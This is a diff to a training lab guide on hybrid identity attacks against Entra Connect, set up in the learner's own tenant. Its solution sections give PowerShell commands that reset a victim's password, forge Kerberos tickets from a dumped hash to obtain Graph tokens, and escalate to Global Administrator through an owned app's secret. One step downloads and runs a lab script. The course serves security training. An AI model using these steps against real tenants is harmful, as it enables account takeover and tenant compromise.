@@ -141,7 +141,7 @@ Use Set-AADIntUserPassword command
 <summary><b>Solution</b></summary>
 
 ```powershell
-Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -AccessToken $at -Verbose
+Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -AccessToken $at -Verbose 
 ```
 Now, open https://entra.microsoft.com in the browser **in incognito** and login as that user *VICTIM_USER@YOURDOMAIN.onmicrosoft.com* with the new password :)
 
@@ -180,16 +180,16 @@ Set the hash:
 ```powershell
 $hash = "CHANGEME"
 ```
-#### 2. Find victim user to impersonate
+#### 2. Find victim user's SID to impersonate
 
 ```powershell
 # Option 1: query Entra + get roles
 Import-Module AzureAD
 Connect-AzureAD # use the dumped Entra Connect creds (Sync_XXX account)
+Get-AzureADUser -All $true | Where-Object {$_.OnPremisesSecurityIdentifier -ne $null} | Select-Object OnPremisesSecurityIdentifier, UserPrincipalName
 
-
-# Option 2: query AD (w/o getting Entra roles)
-Get-ADReplAccount -SamAccountName 'VICTIM_USER' -Domain $domain -Server dcvm # take the "Sid:" part
+# Option 2: query AD (w/o getting Entra roles) - change VICTIM_USER_NAME to the target user
+Get-ADReplAccount -SamAccountName 'VICTIM_USER_NAME' -Domain $domain -Server dcvm # take the "Sid:" part
 ```
 
 Set the victim user's SID:
@@ -204,6 +204,7 @@ $kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash
 
 # get an access token for that user
 $at = Get-AADIntAccessTokenForMSGraph -KerberosTicket $kerberos -Domain $domain".onmicrosoft.com"
+# if you get AADSTS50076 error, it means the user has MFA, try another user (user 5 for example)
 # if you get AADSTS50079 error, it might mean you have a conditional access policy in your Entra tenant named "Security info registration for Microsoft partners and vendors" that blocks this login, you need to reinstall the entire lab from scratch and associate it yo your new tenant
 
 # start exploring what you can do in the tenant using MS Graph API!
@@ -256,7 +257,7 @@ ipconfig # see the IP is of DC VM
 In this last exercise, your goal is to takeover the entire tenant, by getting the 'Global Administrator' role over a compromised user.
 
 #### Preparations
-- Execute the following powershell, and authenticate using your **Entra admin credentials**.
+- Execute the following powershell from dcVm, and authenticate using your **Entra admin credentials**.
 - **DO NOT look into the script** as it will reveal the solution.
 
 
@@ -265,9 +266,10 @@ In this last exercise, your goal is to takeover the entire tenant, by getting th
 
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-2-entra-connect-attacks/lab-2-last-exc-prepartions.ps1" -OutFile "C:\\prepareLab2LastExc.ps1"; `
     & "C:\\prepareLab2LastExc.ps1" `
-    -DomainName YOURDOMAIN.onmicrosoft.com # the one listed here https://admin.microsoft.com/#/Domains
+    -DomainName YOURDOMAIN.onmicrosoft.com -OwnerUsername user3 # the one listed here https://admin.microsoft.com/#/Domains
     ```
 
+- From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM), and you know the Entra tenant domain.
 
 <details>
 <summary><b>Solution</b></summary>
@@ -275,11 +277,11 @@ In this last exercise, your goal is to takeover the entire tenant, by getting th
 **Once you're done, remove any role / permissions you've granted along the way.**
 
 There's an app named "My backup app"
-1. ```user1``` is an Owner of that app, which means he can add secrets to it
+1. ```user3``` is an Owner of that app, which means he can add secrets to it
 1. authenticate as that user (after you've compromised it using the Sync__xx account)
 1. create a new secret for that app or its service principal
 1. use that secret to authenticate as that app
-1. the app has privileged permissions, use them to grant your user (or a new user) a global admin role
+1. the app has privileged permissions, use them to grant your user (or a new user) the global admin role
 </details>
 
 #
